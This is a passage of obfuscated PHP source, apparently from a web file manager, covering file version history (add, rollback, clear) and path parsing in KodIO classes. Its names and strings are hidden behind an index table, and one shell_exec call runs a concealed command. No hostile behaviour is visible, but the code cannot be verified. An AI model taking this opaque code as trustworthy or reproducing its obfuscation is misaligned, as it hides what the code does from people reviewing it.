($ğ©­”×Ä && $ğ©­”×Ä[$·ˆëà”[369]]) { self::clear($èÜíÂ¡, !1); } } else { IO::remove($Â­šœÛ[$·ˆëà”[84]]); self::clearEmptyFolder(IO::pathFather($Â­šœÛ[$·ˆëà”[84]])); } } private static function checkInHistory($¸çğˆÁ¾) { $º…ï”à¥ = self::pathHistory($¸çğˆÁ¾); if (!IO::exist($º…ï”à¥)) { $º…ï”à¥ .= $_SERVER[­õöî’–][1230]; } return IO::exist($º…ï”à¥) ? IO::info($º…ï”à¥) : !1; } private static function parsePath($ÔËê‡ó…) { $ØÔ„“ÏÂ =& $_SERVER[­õöî’–]; if (!$ÔËê‡ó…) { return !1; } if ($GLOBALS[$ØÔ„“ÏÂ[1231]]) { return; } $£øãÆîø = KodIO::parse($ÔËê‡ó…); $¼õ•Õ· = $£øãÆîø[$ØÔ„“ÏÂ[33]]; $à­ë¾è¼ = !$¼õ•Õ· || $¼õ•Õ· == KodIO::KOD_IO || $¼õ•Õ· == KodIO::KOD_SHARE_ITEM; if (!$à­ë¾è¼ || !$£øãÆîø[$ØÔ„“ÏÂ[1232]]) { return !1; } if (substr($ÔËê‡ó…, 0, strlen(DATA_PATH . $ØÔ„“ÏÂ[1233])) == DATA_PATH . $ØÔ„“ÏÂ[1233]) { return !1; } if ($¼õ•Õ· == KodIO::KOD_SHARE_ITEM) { $„€Â°Ğ = IO::init($ÔËê‡ó…); if ($„€Â°Ğ->pathParse[$ØÔ„“ÏÂ[1149]]) { return self::parsePath($„€Â°Ğ->pathParse[$ØÔ„“ÏÂ[1149]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $„—úÇ”õ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ØÔ„“ÏÂ[1234]); foreach ($„—úÇ”õ as $À½öîá‚) { if (!$¼õ•Õ· && substr($ÔËê‡ó…, 0, strlen($À½öîá‚)) == $À½öîá‚) { return !1; } } self::log($GLOBALS[$ØÔ„“ÏÂ[1144]] . $ØÔ„“ÏÂ[1235] . $ÔËê‡ó…); return $ÔËê‡ó…; } private static function pathHistory($÷ Á¼ÄÌ) { $ÚÇ­©Û¥ =& $_SERVER[­õöî’–]; $ïüâá³ = self::$_historyBase . ltrim(KodIO::clear($÷ Á¼ÄÌ), $ÚÇ­©Û¥[8]); $ïüâá³ = str_replace(array($ÚÇ­©Û¥[1236]), array($ÚÇ­©Û¥[1237]), $ïüâá³); return $ïüâá³; } public static function log($˜¤À”÷§) { } public static function historyCount($ºĞ…™åÜ) { $ô¦ÑíƒÖ =& $_SERVER[­õöî’–]; $ÎÛ¡ÏØ = array(); $âÙû˜‚ = array(); foreach ($ºĞ…™åÜ as $¸éµÖ —) { $ß£¤ïÛÚ = get_path_father($¸éµÖ —); if (!$âÙû˜‚[$ß£¤ïÛÚ]) { $âÙû˜‚[$ß£¤ïÛÚ] = array(); } $âÙû˜‚[$ß£¤ïÛÚ][] = get_path_this($¸éµÖ —); } foreach ($âÙû˜‚ as $ß£¤ïÛÚ => $ĞÍÜ«Å) { $œ ö†â£ = self::parsePath($ß£¤ïÛÚ); if (!$œ ö†â£) { continue; } foreach ($ĞÍÜ«Å as $¡Á¥Å§) { $ËÊêÏ¡‚ = self::listData(rtrim($œ ö†â£, $ô¦ÑíƒÖ[8]) . $ô¦ÑíƒÖ[8] . $¡Á¥Å§, !1); if ($ËÊêÏ¡‚ && $ËÊêÏ¡‚[$ô¦ÑíƒÖ[369]]) { $ÎÛ¡ÏØ[rtrim($ß£¤ïÛÚ, $ô¦ÑíƒÖ[8]) . $ô¦ÑíƒÖ[8] . $¡Á¥Å§] = count($ËÊêÏ¡‚[$ô¦ÑíƒÖ[369]]); } } } return $ÎÛ¡ÏØ; } public static function add($£Ïâû“‘) { $ãªê‰ó¼ =& $_SERVER[­õöî’–]; $ÒÑûĞ¥© = self::listData($£Ïâû“‘); if (!$ÒÑûĞ¥©) { return; } $œÏúµ‚Ô = Model($ãªê‰ó¼[761])->get($ãªê‰ó¼[1238]); $£ß­Ø×» = $GLOBALS[$ãªê‰ó¼[6]][$ãªê‰ó¼[89]][$ãªê‰ó¼[1216]]; $óÚ¡é÷ô = $œÏúµ‚Ô == $ãªê‰ó¼[1239] ? min(5, $£ß­Ø×») : $£ß­Ø×»; if ($£ß­Ø×» <= 0) { return; } $õ’¨Ä—´ = IO::info($£Ïâû“‘); $³Ù‚¯¹‹ = $ÒÑûĞ¥©[$ãªê‰ó¼[369]]; if ($õ’¨Ä—´[$ãªê‰ó¼[76]] == 0) { return; } if ($õ’¨Ä—´[$ãªê‰ó¼[76]] >= 1024 * 1024 * 500) { return !1; } $şà¿ÌØ  = IO::hashSimple($£Ïâû“‘); if ($³Ù‚¯¹‹ && $³Ù‚¯¹‹[0][$ãªê‰ó¼[177]] == $şà¿ÌØ ) { return !0; } if (array_key_exists($ãªê‰ó¼[202], $õ’¨Ä—´) && !$õ’¨Ä—´[$ãªê‰ó¼[202]]) { return !1; } $­…İØˆş = short_id(time()); $¤¼ê¶±„ = array($ãªê‰ó¼[399] => $­…İØˆş, $ãªê‰ó¼[177] => $şà¿ÌØ , $ãªê‰ó¼[32] => $õ’¨Ä—´[$ãªê‰ó¼[32]] . $ãªê‰ó¼[10] . date($ãªê‰ó¼[1240]) . rand_string(1), $ãªê‰ó¼[76] => $õ’¨Ä—´[$ãªê‰ó¼[76]], $ãªê‰ó¼[454] => USER_ID, $ãªê‰ó¼[200] => time(), $ãªê‰ó¼[1241] => $ãªê‰ó¼[12]); IO::mkdir($ÒÑûĞ¥©[$ãªê‰ó¼[1242]]); $¼¥ÒïÒ = IO::copy($£Ïâû“‘, $ÒÑûĞ¥©[$ãªê‰ó¼[1242]], !1, $¤¼ê¶±„[$ãªê‰ó¼[32]]); if (!$¼¥ÒïÒ) { self::clearEmptyFolder($ÒÑûĞ¥©[$ãªê‰ó¼[1242]]); return !1; } array_unshift($³Ù‚¯¹‹, $¤¼ê¶±„); if (count($³Ù‚¯¹‹) > $óÚ¡é÷ô) { $è‹õĞ = array_slice($³Ù‚¯¹‹, $óÚ¡é÷ô); foreach ($è‹õĞ as $Æ£¾†­°) { IO::remove($ÒÑûĞ¥©[$ãªê‰ó¼[1242]] . $Æ£¾†­°[$ãªê‰ó¼[32]]); } $³Ù‚¯¹‹ = array_slice($³Ù‚¯¹‹, 0, $óÚ¡é÷ô); } return self::saveData($ÒÑûĞ¥©[$ãªê‰ó¼[1243]], $³Ù‚¯¹‹); } public static function remove($ÃÑû±º, $ÍèÈ÷ö¢) { $í˜…‹ï =& $_SERVER[­õöî’–]; $´ŠĞ±³ = self::listData($ÃÑû±º); $Ğ»±…ÍÛ = array(); if (!$´ŠĞ±³) { return !1; } foreach ($´ŠĞ±³[$í˜…‹ï[369]] as $¥¾—ªåœ) { if ($¥¾—ªåœ[$í˜…‹ï[399]] == $ÍèÈ÷ö¢) { IO::remove($´ŠĞ±³[$í˜…‹ï[1242]] . $¥¾—ªåœ[$í˜…‹ï[32]]); continue; } $Ğ»±…ÍÛ[] = $¥¾—ªåœ; } return self::saveData($´ŠĞ±³[$í˜…‹ï[1243]], $Ğ»±…ÍÛ); } public static function clear($¶î‰ñï­, $–±±”Ô = true) { $¿Í´í›¥ =& $_SERVER[­õöî’–]; $§ÂŞ˜Ù® = self::listData($¶î‰ñï­, $–±±”Ô); if (!$§ÂŞ˜Ù®) { return !1; } foreach ($§ÂŞ˜Ù®[$¿Í´í›¥[369]] as $ŸßÜä†ª) { IO::remove($§ÂŞ˜Ù®[$¿Í´í›¥[1242]] . $ŸßÜä†ª[$¿Í´í›¥[32]]); } return self::saveData($§ÂŞ˜Ù®[$¿Í´í›¥[1243]], array()); } public static function moveHistory($±ĞıÀãã, $ùŠöÊˆ = '', $™İªÊéß = '') { $†—ÔÑ¨ =& $_SERVER[­õöî’–]; $äÂïº¶ = self::listData($±ĞıÀãã, !1); if (!$äÂïº¶ || !$äÂïº¶[$†—ÔÑ¨[369]]) { return !1; } $ñë¥öÓÎ = $†—ÔÑ¨[1230]; $ùŠöÊˆ = $ùŠöÊˆ ? $ùŠöÊˆ : get_path_this($±ĞıÀãã); $™İªÊéß = $™İªÊéß ? $™İªÊéß : $äÂïº¶[$†—ÔÑ¨[1242]]; $Ó”³Ëòä = substr(get_path_this($äÂïº¶[$†—ÔÑ¨[1243]]), 0, -strlen($ñë¥öÓÎ)); foreach ($äÂïº¶[$†—ÔÑ¨[369]] as $ÚÁ§ÒŠÁ => $–š°âí³) { $ˆÙŞ…Í = $ùŠöÊˆ . substr($–š°âí³[$†—ÔÑ¨[32]], strlen($Ó”³Ëòä)); $©ÄûÙİ = IO::move($äÂïº¶[$†—ÔÑ¨[1242]] . $–š°âí³[$†—ÔÑ¨[32]], $™İªÊéß, !1, $ˆÙŞ…Í); if ($©ÄûÙİ) { $äÂïº¶[$†—ÔÑ¨[369]][$ÚÁ§ÒŠÁ][$†—ÔÑ¨[32]] = $ˆÙŞ…Í; } } $äÂïº¶[$†—ÔÑ¨[1243]] = IO::move($äÂïº¶[$†—ÔÑ¨[1243]], $™İªÊéß, !1, $ùŠöÊˆ . $ñë¥öÓÎ); self::saveData($äÂïº¶[$†—ÔÑ¨[1243]], $äÂïº¶[$†—ÔÑ¨[369]]); self::clearEmptyFolder($äÂïº¶[$†—ÔÑ¨[1242]]); } public static function rollback($ËïÙÉßŒ, $¼Ê¬‰ˆÍ) { $åó §¤‰ =& $_SERVER[­õöî’–]; $É¿¨ãæ = self::listData($ËïÙÉßŒ); if (!$É¿¨ãæ) { return; } $…ˆœ¢¥ = IO::info($ËïÙÉßŒ); foreach ($É¿¨ãæ[$åó §¤‰[369]] as $ÁğÉ‚‡ => $ÉÑ™³äÓ) { if ($ÉÑ™³äÓ[$åó §¤‰[399]] == $¼Ê¬‰ˆÍ) { self::add($ËïÙÉßŒ); $É”ğáó = $É¿¨ãæ[$åó §¤‰[1242]] . $ÉÑ™³äÓ[$åó §¤‰[32]]; $¬–áŠë“ = IO::copy($É”ğáó, IO::pathFather($ËïÙÉßŒ), REPEAT_REPLACE, $…ˆœ¢¥[$åó §¤‰[32]]); if ($¬–áŠë“) { self::remove($ËïÙÉßŒ, $¼Ê¬‰ˆÍ); } return $¬–áŠë“; } } return !1; } public static function setDetail($Ã£‚½ä, $˜±ôÁ¡Ö, $³¨’á§) { $îèãÙ =& $_SERVER[­õöî’–]; $’µ©Å¸Õ = self::listData($Ã£‚½ä); if (!$’µ©Å¸Õ) { return; } foreach ($’µ©Å¸Õ[$îèãÙ[369]] as $Ô‹“ï€ï => $×êéå‘à) { if ($×êéå‘à[$îèãÙ[399]] == $˜±ôÁ¡Ö) { $’µ©Å¸Õ[$îèãÙ[369]][$Ô‹“ï€ï][$îèãÙ[1241]] = $³¨’á§; self::saveData($’µ©Å¸Õ[$îèãÙ[1243]], $’µ©Å¸Õ[$îèãÙ[369]]); return !0; } } return !1; } public static function fileInfo($ÁøÛ³ä, $‘«Õ½) { $ÛÛÚÌïÀ =& $_SERVER[­õöî’–]; $“â‘—°„ = self::listData($ÁøÛ³ä); if (!$“â‘—°„) { show_json(LNG($ÛÛÚÌïÀ[105]), !1); } $ç›ı­Â = $ÛÛÚÌïÀ[12]; foreach ($“â‘—°„[$ÛÛÚÌïÀ[369]] as $ƒ¨é¥óã => $Æˆİä«Ë) { if ($Æˆİä«Ë[$ÛÛÚÌïÀ[399]] != $‘«Õ½) { continue; } $ç›ı­Â = $“â‘—°„[$ÛÛÚÌïÀ[1242]] . $Æˆİä«Ë[$ÛÛÚÌïÀ[32]]; break; } if (!$ç›ı­Â) { show_json(LNG($ÛÛÚÌïÀ[105]), !1); } return IO::info($ç›ı­Â); } public static function fileOut($úº´ŒÔ·, $”‹¹Ü¤, $ÎºÈË ˆ = false) { $Æİ˜¨‰Ğ =& $_SERVER[­õöî’–]; $ÃÂì¡Û¥ = self::fileInfo($úº´ŒÔ·, $”‹¹Ü¤); $¾„æ‰¯› =& $GLOBALS[$Æİ˜¨‰Ğ[7]]; $ÎºÈË ˆ = isset($¾„æ‰¯›[$Æİ˜¨‰Ğ[1193]]) && $¾„æ‰¯›[$Æİ˜¨‰Ğ[1193]] == 1; if (isset($¾„æ‰¯›[$Æİ˜¨‰Ğ[33]]) && $¾„æ‰¯›[$Æİ˜¨‰Ğ[33]] == $Æİ˜¨‰Ğ[1244]) { return IO::fileOutImage($ÃÂì¡Û¥[$Æİ˜¨‰Ğ[84]], $¾„æ‰¯›[$Æİ˜¨‰Ğ[1245]]); } IO::fileOut($ÃÂì¡Û¥[$Æİ˜¨‰Ğ[84]], $ÎºÈË ˆ, get_path_this($úº´ŒÔ·)); } public static function listData($ğöüÜàù, $®ßë½¾¶ = true) { $Æ‚ûÛ™ =& $_SERVER[­õöî’–]; if ($®ßë½¾¶ && !IO::exist($ğöüÜàù)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ğöüÜàù, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ÀÔÑ³° = self::pathHistory($ğöüÜàù); $¯ŠÂ¯– = array($Æ‚ûÛ™[1243] => $ÀÔÑ³° . $Æ‚ûÛ™[1230], $Æ‚ûÛ™[1242] => rtrim(get_path_father($ÀÔÑ³°), $Æ‚ûÛ™[8]) . $Æ‚ûÛ™[8], $Æ‚ûÛ™[369] => array()); $úäÚ™ûÁ = IO::getContent($¯ŠÂ¯–[$Æ‚ûÛ™[1243]]); if ($úäÚ™ûÁ) { $´ˆİäŒú = json_decode($úäÚ™ûÁ, !0); if (is_array($´ˆİäŒú)) { $¯ŠÂ¯–[$Æ‚ûÛ™[369]] = $´ˆİäŒú; } } return $¯ŠÂ¯–; } private static function saveData($¨òØÌş”, $»ƒ‘¨•‚) { $Â¦ÅòÉ— =& $_SERVER[­õöî’–]; self::log($Â¦ÅòÉ—[1246] . $¨òØÌş” . $Â¦ÅòÉ—[71] . count($»ƒ‘¨•‚), $Â¦ÅòÉ—[743]); if ($»ƒ‘¨•‚) { return IO::setContent($¨òØÌş”, json_encode($»ƒ‘¨•‚)); } $ò÷òÚ‰Å = IO::pathFather($¨òØÌş”); IO::remove($¨òØÌş”); self::clearEmptyFolder($ò÷òÚ‰Å); return !0; } public static function clearEmptyFolder($»¾ïåğ) { $ÂÙŒº¨ë =& $_SERVER[­õöî’–]; if (trim($»¾ïåğ, $ÂÙŒº¨ë[8]) == trim(self::$_historyBase, $ÂÙŒº¨ë[8])) { return; } $–ø‚çŸû = IO::pathFather($»¾ïåğ); $ûõòãä = IO::has($»¾ïåğ, !0); if ($ûõòãä[$ÂÙŒº¨ë[207]] > 0 || $ûõòãä[$ÂÙŒº¨ë[208]] > 0) { return; } IO::remove($»¾ïåğ); self::clearEmptyFolder($–ø‚çŸû); } private static function getBasePath() { $Ô­…× =& $_SERVER[­õöî’–]; $ˆ±Œ·ö = Model($Ô­…×[1247])->get($Ô­…×[1248]); if ($ˆ±Œ·ö) { if (!IO::exist($ˆ±Œ·ö)) { IO::mkdir($ˆ±Œ·ö); } if (get_path_this($ˆ±Œ·ö) == $Ô­…×[1233]) { $Ş Š¤— = $Ô­…×[1249] . rand_string(8); @rename($ˆ±Œ·ö, get_path_father($ˆ±Œ·ö) . $Ô­…×[8] . $Ş Š¤—); $ˆ±Œ·ö = DATA_PATH . $Ş Š¤— . $Ô­…×[8]; file_put_contents(DATA_PATH . $Ô­…×[1183], $Ô­…×[12]); Model($Ô­…×[1247])->set($Ô­…×[1248], $ˆ±Œ·ö); } return $ˆ±Œ·ö; } $ˆ±Œ·ö = DATA_PATH . $Ô­…×[1249] . rand_string(8) . $Ô­…×[8]; $ˆ±Œ·ö = IO::mkdir($ˆ±Œ·ö); $ˆ±Œ·ö = rtrim($ˆ±Œ·ö, $Ô­…×[8]) . $Ô­…×[8]; file_put_contents($ˆ±Œ·ö . $Ô­…×[1183], $Ô­…×[12]); file_put_contents(DATA_PATH . $Ô­…×[1183], $Ô­…×[12]); Model($Ô­…×[1247])->set($Ô­…×[1248], $ˆ±Œ·ö); return $ˆ±Œ·ö; } } class KodIO { const KOD_SOURCE = "\x7b\163\x6f\165\x72\x63\145\175"; const KOD_USER_RECYCLE = "\173\165\x73\x65\x72\x52\x65\x63\171\x63\x6c\x65\175"; const KOD_USER_FAV = "\x7b\165\163\145\162\x46\141\x76\175"; const KOD_USER_FILE_TAG = "\x7b\x75\163\145\x72\106\x69\x6c\x65\124\x61\x67\175"; const KOD_USER_FILE_TYPE = "\173\165\163\x65\x72\x46\151\x6c\145\124\171\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\157\x75\160\x52\x6f\x6f\x74\x53\145\154\146\175"; const KOD_USER_SHARE = "\x7b\165\163\145\x72\x53\x68\x61\x72\x65\175"; const KOD_USER_SHARE_LINK = "\173\165\x73\x65\162\x53\x68\141\x72\x65\114\x69\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\x61\x72\145\x54\157\x4d\x65\175"; const KOD_SHARE_ITEM = "\173\163\150\141\x72\145\111\164\x65\155\175"; const KOD_SHARE_LINK = "\173\163\x68\x61\162\145\x49\x74\x65\x6d\114\x69\156\153\x7d"; const KOD_SEARCH = "\173\x73\145\141\x72\143\150\175"; const KOD_BLOCK = "\x7b\x62\x6c\x6f\x63\x6b\175"; const KOD_IO = "\x7b\x69\x6f\175"; const KOD_USER_RECENT = "\173\x75\163\x65\162\122\x65\x6e\x63\145\x6e\x74\175"; const KOD_USER_DRIVER = "\173\144\x72\151\166\145\162\175"; public static function typeList() { $ÓÈ«â¯ =& $_SERVER[­õöî’–]; return array($ÓÈ«â¯[1250] => self::KOD_SOURCE, $ÓÈ«â¯[1251] => self::KOD_USER_RECYCLE, $ÓÈ«â¯[1252] => self::KOD_USER_FAV, $ÓÈ«â¯[1253] => self::KOD_USER_FILE_TAG, $ÓÈ«â¯[1254] => self::KOD_USER_FILE_TYPE, $ÓÈ«â¯[1255] => self::KOD_GROUP_ROOT_SELF, $ÓÈ«â¯[1256] => self::KOD_USER_SHARE, $ÓÈ«â¯[1257] => self::KOD_USER_SHARE_LINK, $ÓÈ«â¯[1258] => self::KOD_USER_SHARE_TO_ME, $ÓÈ«â¯[1259] => self::KOD_SHARE_ITEM, $ÓÈ«â¯[1260] => self::KOD_SHARE_LINK, $ÓÈ«â¯[1261] => self::KOD_SEARCH, $ÓÈ«â¯[1262] => self::KOD_BLOCK, $ÓÈ«â¯[1263] => self::KOD_IO, $ÓÈ«â¯[1264] => self::KOD_USER_RECENT, $ÓÈ«â¯[1265] => self::KOD_USER_DRIVER); } public static function parse($Ñå¶ÎÆ†) { $’¼Ø…èá =& $_SERVER[­õöî’–]; $Ñå¶ÎÆ† = self::clear($Ñå¶ÎÆ†); $ì†ı£İö = array_values(self::typeList()); preg_match($’¼Ø…èá[1266], $Ñå¶ÎÆ†, $úÚî’ÇÍ); $ÛğÈ‹…§ = array($’¼Ø…èá[422] => !1, $’¼Ø…èá[1267] => !1, $’¼Ø…èá[419] => !1, $’¼Ø…èá[84] => $Ñå¶ÎÆ†, $’¼Ø…èá[1168] => !1, $’¼Ø…èá[1167] => $’¼Ø…èá[12]); if (is_array($úÚî’ÇÍ) && count($úÚî’ÇÍ) == 5) { $ ÃÓâşŠ = $’¼Ø…èá[1268] . $úÚî’ÇÍ[2] . $’¼Ø…èá[327]; if (in_array($ ÃÓâşŠ, $ì†ı£İö)) { $ÛğÈ‹…§[$’¼Ø…èá[1168]] = $úÚî’ÇÍ[1]; $ÛğÈ‹…§[$’¼Ø…èá[33]] = $ ÃÓâşŠ; $ÛğÈ‹…§[$’¼Ø…èá[1269]] = substr($ ÃÓâşŠ, 1, -1); $ÛğÈ‹…§[$’¼Ø…èá[399]] = $úÚî’ÇÍ[3]; } $ÛğÈ‹…§[$’¼Ø…èá[1167]] = $úÚî’ÇÍ[4]; } $¹™ÛÖˆ’ = array($’¼Ø…èá[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ÛğÈ‹…§[$’¼Ø…èá[1232]] = in_array($ÛğÈ‹…§[$’¼Ø…èá[33]], $¹™ÛÖˆ’); return $ÛğÈ‹…§; } public static function isTruePath($½ö¤–ê˜) { $¯›ì¯ˆô =& $_SERVER[­õöî’–]; if (substr($½ö¤–ê˜, 0, 1) != $¯›ì¯ˆô[1268]) { return !0; } if (strpos($½ö¤–ê˜, $¯›ì¯ˆô[408]) === 0) { return !0; } if (strpos($½ö¤–ê˜, $¯›ì¯ˆô[1236]) === 0) { return !0; } if (strpos($½ö¤–ê˜, $¯›ì¯ˆô[1270]) === 0) { return !0; } if (strpos($½ö¤–ê˜, $¯›ì¯ˆô[1271]) === 0) { return !0; } if (strpos($½ö¤–ê˜, $¯›ì¯ˆô[1272]) === 0) { return !0; } return !1; } public static function clear($«§£ø ) { $˜š²ò­è =& $_SERVER[­õöî’–]; $«§£ø  = str_replace(array($˜š²ò­è[1076], $˜š²ò­è[231]), $˜š²ò­è[53], $«§£ø ); $«§£ø  = str_replace($˜š²ò­è[97], $˜š²ò­è[8], $«§£ø ); $¹„ã¢™‰ = $˜š²ò­è[1273]; if (substr($«§£ø , 0, 3) == $˜š²ò­è[1274]) { $«§£ø  = substr($«§£ø , 3); } while (strstr($«§£ø , $¹„ã¢™‰)) { $«§£ø  = str_replace($¹„ã¢™‰, $˜š²ò­è[8], $«§£ø ); } $«§£ø  = preg_replace($˜š²ò­è[1275], $˜š²ò­è[8], $«§£ø ); if ($«§£ø  == $˜š²ò­è[8]) { return $˜š²ò­è[8]; } $«§£ø  = rtrim($«§£ø , $˜š²ò­è[8]); return $«§£ø ; } public static function sourceID($ñ•ôİ¸Ø) { $©ê¬¿è» =& $_SERVER[­õöî’–]; $ğ‹ëÏŸ• = self::parse($ñ•ôİ¸Ø); if ($ğ‹ëÏŸ•[$©ê¬¿è»[33]] !== self::KOD_SOURCE) { show_json(LNG($©ê¬¿è»[1276]), !1); } return $ğ‹ëÏŸ•[$©ê¬¿è»[399]]; } public static function make($‚”Úàğ) { if (!$‚”Úàğ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($‚”Úàğ)); } public static function makeShare($¹Ô“»´®, $×œÑ×Šƒ) { return self::makePath(self::KOD_SHARE_ITEM, $¹Ô“»´®, $×œÑ×Šƒ); } public static function makeFileTypePath($Ğƒ••¢€) { return self::makePath(self::KOD_USER_FILE_TYPE, $Ğƒ••¢€); } public static function makeFileTagPath($™Šö®º÷) { return self::makePath(self::KOD_USER_FILE_TAG, $™Šö®º÷); } public static function makePath($³´†¤¡·, $ä›§È = '', $³ÕàœÜş = '') { $İÀÆŠş =& $_SERVER[­õöî’–]; $ÉÉ’Ÿïü = substr($³´†¤¡·, 1, -1); $ŒïììÜó = $İÀÆŠş[1277] . $ÉÉ’Ÿïü . $İÀÆŠş[1278] . $ä›§È . $İÀÆŠş[1279]; $ŒïììÜó = $³ÕàœÜş ? $ŒïììÜó . $³ÕàœÜş . $İÀÆŠş[8] : $ŒïììÜó; return $ŒïììÜó; } public static function hashPath($úóŞÎÃ¡, $‚èŒ‹æ¶ = true) { $™Õ‘¢€¹ =& $_SERVER[­õöî’–]; $™¥âì = is_array($úóŞÎÃ¡) ? $úóŞÎÃ¡ : IO::info($úóŞÎÃ¡); $àíÔ×´º = _get($™¥âì, $™Õ‘¢€¹[1280], $™Õ‘¢€¹[12]); if (!$àíÔ×´º && isset($™¥âì[$™Õ‘¢€¹[402]])) { $™¥âì = IO::info(KodIO::make($™¥âì[$™Õ‘¢€¹[402]])); $àíÔ×´º = _get($™¥âì, $™Õ‘¢€¹[1280], $™Õ‘¢€¹[12]); } if (!$àíÔ×´º && $‚èŒ‹æ¶) { $‹É©¼– = KodIO::parse($™¥âì[$™Õ‘¢€¹[84]]); if (!$‹É©¼–[$™Õ‘¢€¹[33]]) { $àíÔ×´º = IO::hashSimple($™¥âì[$™Õ‘¢€¹[84]]); } } if (!$àíÔ×´º) { $àíÔ×´º = md5($™¥âì[$™Õ‘¢€¹[84]] . $™¥âì[$™Õ‘¢€¹[76]] . $™¥âì[$™Õ‘¢€¹[85]]); } return $àíÔ×´º; } public static function hashPathSafe($‚¨ ¾ğø, $Ûª·ã‰› = true) { $ú¯Òéô¥ =& $_SERVER[­õöî’–]; $ï“ªáÂ = self::hashPath($‚¨ ¾ğø, $Ûª·ã‰›); return md5($ï“ªáÂ . $ú¯Òéô¥[1281] . Model($ú¯Òéô¥[761])->get($ú¯Òéô¥[762])); } public static function initSystemPath() { $ğÛ÷‰Û =& $_SERVER[­õöî’–]; if (defined($ğÛ÷‰Û[1282])) { return; } define($ğÛ÷‰Û[1282], self::systemPath($ğÛ÷‰Û[1283])); define($ğÛ÷‰Û[1284], self::systemPath($ğÛ÷‰Û[1285])); define($ğÛ÷‰Û[1286], self::systemPath($ğÛ÷‰Û[1287])); define($ğÛ÷‰Û[1288], self::systemPath($ğÛ÷‰Û[1289])); IOHistory::bindEvent(); } public static function systemPath($À¶ñšêÖ) { $ØÚé¼µ« =& $_SERVER[­õöî’–]; $Ïá³Áµ = $ØÚé¼µ«[1290] . ucfirst($À¶ñšêÖ); $¿Ñà’¬Ë = Model($ØÚé¼µ«[761])->get($Ïá³Áµ); if ($¿Ñà’¬Ë) { return $¿Ñà’¬Ë; } if ($À¶ñšêÖ == $ØÚé¼µ«[1283]) { $¿Ñà’¬Ë = self::make(Model($ØÚé¼µ«[816])->systemRootPathAdd($ØÚé¼µ«[544])); } else { $¿Ñà’¬Ë = self::systemPath($ØÚé¼µ«[1283]); $²Ë¥÷ı– = self::sourceID($¿Ñà’¬Ë); $¿Ñà’¬Ë = self::make(Model($ØÚé¼µ«[816])->mkdir($²Ë¥÷ı–, $À¶ñšêÖ)); } Model($ØÚé¼µ«[761])->set($Ïá³Áµ, $¿Ñà’¬Ë); return $¿Ñà’¬Ë; } public static function systemFolder($ˆ™ŞèÛ) { $Œ­ô±‹¹ = IO_PATH_SYSTEM_SOURCE . $ˆ™ŞèÛ; $³µ‹äº„ = Cache::get($Œ­ô±‹¹); if (!$³µ‹äº„) { $æ•ªÑší = IO::infoFull($Œ­ô±‹¹); if (!$æ•ªÑší) { $³µ‹äº„ = IO::mkdir($Œ­ô±‹¹, REPEAT_SKIP); } else { $³µ‹äº„ = $æ•ªÑší[$_SERVER[­õöî’–][84]]; } Cache::set($Œ­ô±‹¹, $³µ‹äº„, 3600 * 10); } return $³µ‹äº„; } public static function defaultDriver() { return Model($_SERVER[­õöî’–][758])->defaultDriver(); } public static function defaultIO() { $µòŒ·ÕÅ =& $_SERVER[­õöî’–]; $¯û‰ò¹¸ = self::defaultDriver(); return $µòŒ·ÕÅ[1291] . $¯û‰ò¹¸[$µòŒ·ÕÅ[399]] . $µòŒ·ÕÅ[1279]; } public static function defaultDriverInit() { static $¯ÓÅµ¨œ = false; if ($¯ÓÅµ¨œ) { return $¯ÓÅµ¨œ; } $¯ÓÅµ¨œ = IO::init(self::defaultIO()); return $¯ÓÅµ¨œ; } public static function fileTypeList() { $Š•”èç =& $_SERVER[­õöî’–]; $µƒë˜é‚ = $GLOBALS[$Š•”èç[6]][$Š•”èç[1292]]; foreach ($µƒë˜é‚ as $“ı†ÊóÔ => $Ş­›²“×) { $Šó†îíÌ = $Š•”èç[1293] . $“ı†ÊóÔ; $‡Ò¥õê = LNG($Šó†îíÌ); if ($Šó†îíÌ != $‡Ò¥õê) { $µƒë˜é‚[$“ı†ÊóÔ][$Š•”èç[32]] = $‡Ò¥õê; } } return $µƒë˜é‚; } public static function diskList($›òƒ€”Æ = true) { $®»‡½‰ = $_SERVER[­õöî’–][1294]; if ($›òƒ€”Æ) { $¼¶÷Ä‹„ = Cache::get($®»‡½‰); if (is_array($¼¶÷Ä‹„)) { return $¼¶÷Ä‹„; } } $¼¶÷Ä‹„ = self::diskListGet(); Cache::set($®»‡½‰, $¼¶÷Ä‹„, 60); return $¼¶÷Ä‹„; } public static function diskListGet() { $Ó»ëŞ“Ç =& $_SERVER[­õöî’–]; $¯ó–À³¤ = array(); if ($GLOBALS[$Ó»ëŞ“Ç[6]][$Ó»ëŞ“Ç[1295]] == $Ó»ëŞ“Ç[1296]) { $”àäÛ “ = $Ó»ëŞ“Ç[1297]; for ($–†¥Ï²° = 0; $–†¥Ï²° < strlen($”àäÛ “); $–†¥Ï²°++) { $²ÃÕÎè = $”àäÛ “[$–†¥Ï²°] . $Ó»ëŞ“Ç[1298]; if (file_exists($²ÃÕÎè)) { $¯ó–À³¤[] = $²ÃÕÎè; } } return $¯ó–À³¤; } if (!function_exists($Ó»ëŞ“Ç[98])) { $¯ó–À³¤[] = $Ó»ëŞ“Ç[826]; return $¯ó–À³¤; } $‡ÅÁÒüÎ = explode($Ó»ëŞ“Ç[231], shell_exec($Ó»ëŞ“Ç[1299])); array_shift($‡ÅÁÒüÎ); array_pop($‡ÅÁÒüÎ); $¬˜íî“İ = array($Ó»ëŞ“Ç[1300], $Ó»ëŞ“Ç[1301], $Ó»ëŞ“Ç[1302], $Ó»ëŞ“Ç[1303], $Ó»ëŞ“Ç[1304], $Ó»ëŞ“Ç[1305], $Ó»ëŞ“Ç[1306], $Ó»ëŞ“Ç[1307]); foreach ($‡ÅÁÒüÎ as $¢¹„˜Ë†) { $½°çä¿Ò = preg_split($Ó»ëŞ“Ç[1308], $¢¹„˜Ë†); $²ÃÕÎè = $½°çä¿Ò[count($½°çä¿Ò) - 1]; if (!strstr($½°çä¿Ò[0], $Ó»ëŞ“Ç[1309]) || !$²ÃÕÎè) { continue; } $ÌšåÄ§¦ = 